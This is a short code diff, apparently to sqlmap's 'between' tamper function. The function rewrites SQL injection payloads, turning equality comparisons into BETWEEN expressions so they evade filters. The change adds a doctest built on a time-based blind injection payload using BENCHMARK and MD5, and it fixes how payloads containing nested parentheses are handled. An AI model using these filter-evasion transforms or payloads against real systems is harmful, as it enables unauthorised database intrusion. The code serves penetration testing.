@@ -38,6 +38,8 @@ def tamper(payload, **kwargs):
     '1 AND A BETWEEN B AND B--'
     >>> tamper('1 AND LAST_INSERT_ROWID()=LAST_INSERT_ROWID()')
     '1 AND LAST_INSERT_ROWID() BETWEEN LAST_INSERT_ROWID() AND LAST_INSERT_ROWID()'
+    >>> tamper('1 AND 2314=BENCHMARK(5000000,MD5(0x41))')
+    '1 AND 2314=BENCHMARK(5000000,MD5(0x41))'
     >>> tamper('CASE WHEN 1=2 THEN id ELSE 0 END')
     'CASE WHEN 1 BETWEEN 2 AND 2 THEN id ELSE 0 END'
     """
@@ -56,7 +58,7 @@ def tamper(payload, **kwargs):
         if retVal == payload:
             match = re.search(r"(?i)(\b(AND|OR)\b\s+)(?!.*\b(AND|OR)\b)([^=]+?)\s*(?<![<>!])=(?!=)\s*([\w()]+)\s*", payload)  # Note: avoiding compound operators (e.g. >=, !=)
 
-            if match:
+            if match and match.group(5).count('(') == match.group(5).count(')'):  # Note: e.g. 'BENCHMARK(5000000,MD5(..))' can't be cut at its comma
                 _ = "%s %s BETWEEN %s AND %s" % (match.group(2), match.group(4), match.group(5), match.group(5))
                 retVal = retVal.replace(match.group(0), _)
 
